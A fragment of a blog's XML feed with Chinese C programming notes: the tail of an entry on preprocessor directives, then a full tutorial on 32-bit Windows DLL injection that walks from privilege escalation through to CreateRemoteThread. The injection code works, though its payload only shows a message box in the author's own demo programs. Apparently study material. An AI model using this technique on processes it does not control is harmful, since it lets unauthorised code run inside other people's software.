class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line">提示如下的编译信息：Hello.c(<span class="number">15</span>) : error C2065: <span class="string">&#x27;CONST_NAME1&#x27;</span> : undeclared identifier</span><br><span class="line">表示当前文件的名称被认为是Hello.c， <span class="meta">#<span class="keyword">line</span> 10 <span class="string">&quot;Hello.c&quot;</span>所在的行被认为是第10行，因此提示第15行出错。</span></span><br><span class="line">形式<span class="number">2</span>语法格式如下:</span><br><span class="line"><span class="meta"># <span class="keyword">line</span> constant:其作用在于编译的时候，准确输出出错代码所在的位置（行号），而在源程序中并不出现行号，从而方便程序员准确定位。</span></span><br><span class="line">④运算符#和##  #@  ‘’</span><br><span class="line">在ANSI C中为预编译指令定义了两个运算符——#和##。# 的作用是实现文本替换，例如</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HI(x) printf(<span class="string">&quot;Hi,&quot;</span>#x<span class="string">&quot;/n&quot;</span>);</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HI(John);</span><br><span class="line">&#125;</span><br><span class="line">程序的运行结果：Hi,John</span><br><span class="line">在预编译处理的时候, <span class="string">&quot;#x&quot;</span>的作用是将x替换为所代表的字符序列。在本程序中x为John，所以构建新串“Hi,John”。</span><br><span class="line">##的作用是串连接。例如</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONNECT(x,y) x##y</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a1,a2,a3;</span><br><span class="line">CONNECT(a,<span class="number">1</span>)=<span class="number">0</span>;</span><br><span class="line">CONNECT(a,<span class="number">2</span>)=<span class="number">12</span>;</span><br><span class="line">a3=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a1=%d/ta2=%d/ta3=%d&quot;</span>,a1,a2,a3);</span><br><span class="line">&#125;</span><br><span class="line">程序的运行结果为：a1=<span class="number">0</span> a2=<span class="number">12</span> a3=<span class="number">4</span></span><br><span class="line">在编译之前， CONNECT(a,<span class="number">1</span>)被翻译为a1， CONNECT(a,<span class="number">2</span>)被翻译为a2。</span><br><span class="line">⑤预定义常量</span><br><span class="line">__LINE__：当前源代码的行号，为整型常量 </span><br><span class="line">__FILE__：当前编译程序文件的名称，为字符串 </span><br><span class="line">__DATE__：编译程序文件日期，为字符串（”MM DD YYYY＂形式，如”　Jan <span class="number">19</span> <span class="number">1993</span>”） </span><br><span class="line">__TIME__：编译程序文件时间，为字符串（＂hh:mm:ss＂形式，如”<span class="number">08</span>:<span class="number">30</span>:<span class="number">23</span>”） </span><br><span class="line">__STDC__：ANSI C标志，整型常量<span class="number">1</span>,说明此程序兼容ANSI C标准。</span><br><span class="line"></span><br><span class="line"><span class="number">.2</span> <span class="meta">#<span class="keyword">line</span>等</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span>指令将使编译器显示一条错误信息，然后停止编译。</span></span><br><span class="line"><span class="meta">#<span class="keyword">line</span>指令改变_LINE_与_FILE_的内容，它们是在编译程序中预先定义的标识符。</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>指令没有正式的定义。编译器可以自定义其用途。典型的用法是禁止或允许某些烦人的警告信息。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//例10,#line举例</span></span><br><span class="line"><span class="meta">#<span class="keyword">line</span>   100          <span class="comment">//初始化行计数器 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>    <span class="comment">//行号100</span></span></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,__LINE__);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出104</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-06_32位下dll注入</title>
    <url>/posts/9c5cfbfa/</url>
    <content><![CDATA[<p>VirtualAllocEx    其他进程的地址空间申请内存</p>
<p>WriteProcessMemory    将代码数据写入到目的进程</p>
<p>CreateRomoteThread    在其他进程中创建线程</p>
<ol>
<li>将需要执行的代码写到一个dll中 </li>
<li>在目标进程申请一块内存将dll文件名写入</li>
<li>将目标进程地址空间中的Loadlibary当作线程函数执行</li>
</ol>
<h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DLLMain</span><span class="params">(HMODULE hmodle,DWORD dwReason,<span class="type">void</span>* p)</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> (dwReason)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程创建时调用    刚加载时会被执行</span></span><br><span class="line">			MessageBoxA(<span class="number">0</span>, <span class="string">&quot;注入成功&quot;</span>, <span class="string">&quot;注入成功&quot;</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//case DLL_PROCESS_DETACH:  //进程销毁时调用</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>属性页  配置属性-&gt;常规-&gt; 生成dll      ； c/c++ -&gt;代码生成-&gt;Spectre缓解 改为已禁用</p>
<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注入之前需要对进程提权</span></span><br><span class="line"><span class="type">int</span>	进程提权() &#123;</span><br><span class="line">	<span class="type">int</span> FLAG = <span class="number">0</span>;  <span class="comment">//提权是否成功 成功为1</span></span><br><span class="line">	HANDLE 进程访问令牌 ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,&amp;进程访问令牌)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES 令牌权限;</span><br><span class="line">		令牌权限.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;令牌权限.Privileges[<span class="number">0</span>].Luid);<span class="comment">//遍历权限</span></span><br><span class="line"></span><br><span class="line">		令牌权限.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<span class="comment">//开启特权</span></span><br><span class="line">		<span class="keyword">if</span> (AdjustTokenPrivileges(进程访问令牌,FALSE,&amp;令牌权限,<span class="keyword">sizeof</span>(令牌权限),<span class="literal">NULL</span>,<span class="literal">NULL</span>)) &#123;</span><br><span class="line">			FLAG = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(进程访问令牌);</span><br><span class="line">	<span class="keyword">return</span> FLAG;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历进程   // 目前在进程遍历时无法找到对应名 。。。</span></span><br><span class="line"><span class="type">int</span> _findProcess(<span class="type">char</span>* name) &#123;</span><br><span class="line">	HANDLE 快照 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	Process32First(快照, &amp;pe32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Process32Next(快照,&amp;pe32))&#123;</span><br><span class="line">		<span class="keyword">if</span> (_strcmpi(pe32.szExeFile, name) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//找不到返回0</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注入的exe  和 使用的dll名</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dllinject</span><span class="params">(<span class="type">char</span>* exename, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (进程提权() == <span class="number">1</span>) &#123;</span><br><span class="line">		HANDLE 目标进程ID = _findProcess(exename);</span><br><span class="line">		<span class="keyword">if</span> (目标进程ID!=<span class="number">0</span>) &#123;  <span class="comment">//找到目标进程</span></span><br><span class="line">			HANDLE 目标进程句柄 = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 目标进程ID);</span><br><span class="line">			<span class="keyword">if</span> (目标进程句柄 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line">				<span class="comment">//开始注入</span></span><br><span class="line">				<span class="comment">//获取dlllength  在目标申请一块内存 写入dll</span></span><br><span class="line">				<span class="type">int</span> dllLength = <span class="built_in">strlen</span>(dllname);</span><br><span class="line">				<span class="type">void</span> * dll文件名地址 = VirtualAllocEx(目标进程句柄,<span class="literal">NULL</span>, dllLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">				<span class="keyword">if</span> (dll文件名地址 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;分配内存失败&quot;</span>);</span><br><span class="line">				&#125; </span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">					WriteProcessMemory(目标进程句柄, dll文件名地址, dllname, dllLength, <span class="number">0</span>); <span class="comment">//写入内存</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">//创建远程线程</span></span><br><span class="line">					HMODULE hmode = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);   <span class="comment">// LoadLibrary 在ker32下</span></span><br><span class="line">					LPTHREAD_START_ROUTINE 函数地址 = GetProcAddress(hmode, <span class="string">&quot;LoadLibraryA&quot;</span>); <span class="comment">// LPTHREAD_START_ROUTINE</span></span><br><span class="line"></span><br><span class="line">					HANDLE hthread =  CreateRemoteThread(目标进程句柄,<span class="literal">NULL</span>,<span class="number">0</span>,函数地址,dll文件名地址,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;创建远程线程失败&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				GetLastError();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;进程打开失败&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;进程提权失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* exename = <span class="string">&quot;AsmDEMO.exe&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* dllname = <span class="string">&quot;32injectdll.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">	dllinject(exename,dllname);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用一个32位demo.exe测试</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hellworld&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>经过调试目前无法通过进程遍历找到所要测试的demo.exe ….. 原因找到了 <strong>是因为字符集问题</strong> 本来是使用的Unicode 设置成未设置 即可成功读取到进程  成功将dll注入到32位的exe下</p>
<p><img src="/posts/9c5cfbfa/6-1.png" alt="img"></p>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>选择加载dll中的指定函数</p>
<p>dll</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">fn</span><span class="params">()</span> &#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;fn注入成功&quot;</span>, <span class="string">&quot;fn注入成功&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DLLMain</span><span class="params">(HMODULE hmodle,DWORD dwReason,<span class="type">void</span>* p)</span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> (dwReason)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程创建时调用    刚加载时会被执行</span></span><br><span class="line">			MessageBoxA(<span class="number">0</span>, <span class="string">&quot;注入成功&quot;</span>, <span class="string">&quot;注入成功&quot;</span>, <span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="comment">//case DLL_PROCESS_DETACH:  //进程销毁时调用</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//注入之前需要对进程提权</span></span><br><span class="line"><span class="type">int</span>	进程提权() &#123;</span><br><span class="line">	<span class="type">int</span> FLAG = <span class="number">0</span>;  <span class="comment">//提权是否成功 成功为1</span></span><br><span class="line">	HANDLE 进程访问令牌 ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,&amp;进程访问令牌)) &#123;</span><br><span class="line">		TOKEN_PRIVILEGES 令牌权限;</span><br><span class="line">		令牌权限.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">		LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;令牌权限.Privileges[<span class="number">0</span>].Luid);<span class="comment">//遍历权限</span></span><br><span class="line"></span><br><span class="line">		令牌权限.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<span class="comment">//开启特权</span></span><br><span class="line">		<span class="keyword">if</span> (AdjustTokenPrivileges(进程访问令牌,FALSE,&amp;令牌权限,<span class="keyword">sizeof</span>(令牌权限),<span class="literal">NULL</span>,<span class="literal">NULL</span>)) &#123;</span><br><span class="line">			FLAG = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(进程访问令牌);</span><br><span class="line">	<span class="keyword">return</span> FLAG;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历进程</span></span><br><span class="line"><span class="type">int</span> _findProcess(<span class="type">char</span>* name) &#123;</span><br><span class="line">	HANDLE 快照 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">	Process32First(快照, &amp;pe32);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Process32Next(快照, &amp;pe32)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (_strcmpi(pe32.szExeFile, name) == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;找到对应进程名!\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//找不到返回0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注入的exe  和 使用的dll名</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dllinject</span><span class="params">(<span class="type">char</span>* exename, <span class="type">char</span>* dllname)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;加载dllinject函数\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (进程提权() == <span class="number">1</span>) &#123;</span><br><span class="line">		HANDLE 目标进程ID = _findProcess(exename);</span><br><span class="line">		<span class="keyword">if</span> (目标进程ID!=<span class="number">0</span>) &#123;  <span class="comment">//找到目标进程</span></span><br><span class="line">			HANDLE 目标进程句柄 = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 目标进程ID);</span><br><span class="line">			<span class="keyword">if</span> (目标进程句柄 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;开始注入\n&quot;</span>);</span><br><span class="line">				<span class="comment">//开始注入</span></span><br><span class="line">				<span class="comment">//获取dlllength  在目标申请一块内存 写入dll</span></span><br><span class="line">				<span class="type">int</span> dllLength = <span class="built_in">strlen</span>(dllname);</span><br><span class="line">				<span class="type">void</span> * dll文件名地址 = VirtualAllocEx(目标进程句柄,<span class="literal">NULL</span>, dllLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">				<span class="keyword">if</span> (dll文件名地址 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					GetLastError();</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;分配内存失败\n&quot;</span>);</span><br><span class="line">				&#125; </span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;开始写入内存\n&quot;</span>);</span><br><span class="line">					WriteProcessMemory(目标进程句柄, dll文件名地址, dllname, dllLength, <span class="number">0</span>); <span class="comment">//写入内存</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">//创建远程线程</span></span><br><span class="line">					HMODULE hmode = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);   <span class="comment">// LoadLibrary 在ker32下</span></span><br><span class="line">					LPTHREAD_START_ROUTINE 函数地址 = GetProcAddress(hmode, <span class="string">&quot;LoadLibraryA&quot;</span>); <span class="comment">// LPTHREAD_START_ROUTINE</span></span><br><span class="line"></span><br><span class="line">					HANDLE hthread =  CreateRemoteThread(目标进程句柄,<span class="literal">NULL</span>,<span class="number">0</span>,函数地址,dll文件名地址,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						GetLastError();</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;创建远程线程失败\n&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				GetLastError();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;进程打开失败\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;找不到对应进程！\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;进程提权失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dllinjectfn</span><span class="params">(<span class="type">char</span>* exename, <span class="type">char</span>* dllname, <span class="type">char</span>* fnname)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;加载dllinjectfn函数\n&quot;</span>);</span><br><span class="line">	HMODULE dll模块首地址 = LoadLibrary(dllname);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>(*fn函数地址)() = (<span class="type">void</span>(*)()) GetProcAddress(dll模块首地址,fnname);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> 偏移量 = (<span class="type">char</span>*)fn函数地址 - (<span class="type">char</span>*)dll模块首地址;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (进程提权() == <span class="number">1</span>) &#123;</span><br><span class="line">		HANDLE 目标进程ID = _findProcess(exename);</span><br><span class="line">		<span class="keyword">if</span> (目标进程ID != <span class="number">0</span>) &#123;  <span class="comment">//找到目标进程</span></span><br><span class="line">			HANDLE 目标进程句柄 = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 目标进程ID);</span><br><span class="line">			<span class="keyword">if</span> (目标进程句柄 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;开始注入\n&quot;</span>);</span><br><span class="line">				<span class="comment">//开始注入</span></span><br><span class="line">				<span class="comment">//获取dlllength  在目标申请一块内存 写入dll</span></span><br><span class="line">				<span class="type">int</span> dllLength = <span class="built_in">strlen</span>(dllname);</span><br><span class="line">				<span class="type">void</span>* dll文件名地址 = VirtualAllocEx(目标进程句柄, <span class="literal">NULL</span>, dllLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">				<span class="keyword">if</span> (dll文件名地址 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					GetLastError();</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;分配内存失败\n&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;开始写入内存\n&quot;</span>);</span><br><span class="line">					WriteProcessMemory(目标进程句柄, dll文件名地址, dllname, dllLength, <span class="number">0</span>); <span class="comment">//写入内存</span></span><br><span class="line"></span><br><span class="line">					<span class="comment">//创建远程线程</span></span><br><span class="line">					HMODULE hmode = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);   <span class="comment">// LoadLibrary 在ker32下</span></span><br><span class="line">					LPTHREAD_START_ROUTINE 函数地址 = GetProcAddress(hmode, <span class="string">&quot;LoadLibraryA&quot;</span>); <span class="comment">// LPTHREAD_START_ROUTINE</span></span><br><span class="line"></span><br><span class="line">					HANDLE hthread = CreateRemoteThread(目标进程句柄, <span class="literal">NULL</span>, <span class="number">0</span>, 函数地址, dll文件名地址, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						GetLastError();</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;创建远程线程失败\n&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					WaitForSingleObject(hthread, INFINITE);</span><br><span class="line"></span><br><span class="line">					DWORD dll模块 = <span class="number">0</span>; <span class="comment">//初始化</span></span><br><span class="line">					GetExitCodeThread(hthread, &amp;dll模块);</span><br><span class="line">					<span class="type">void</span>(*fn)() = (dll模块 + 偏移量); <span class="comment">//返回一个地址   void(*)</span></span><br><span class="line">					<span class="comment">//创建一个远程线程</span></span><br><span class="line">					hthread = CreateRemoteThread(目标进程句柄, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)fn, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (hthread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">						GetLastError();</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;创建远程线程失败\n&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					WaitForSingleObject(hthread, INFINITE);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				GetLastError();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;进程打开失败\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			CloseHandle(目标进程ID);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			GetLastError();</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;找不到对应进程！\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;进程提权失败\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* exename = <span class="string">&quot;test32.exe&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* dllname = <span class="string">&quot;32injectdll.dll&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* fnname = <span class="string">&quot;fn&quot;</span>;</span><br><span class="line">	<span class="comment">//dllinject(exename,dllname);</span></span><br><span class="line">	dllinjectfn(exename, dllname, <span class="string">&quot;fn&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-05_内存补丁、断点中断、单步中断</title>
    <url>/posts/89f9b82/</url>
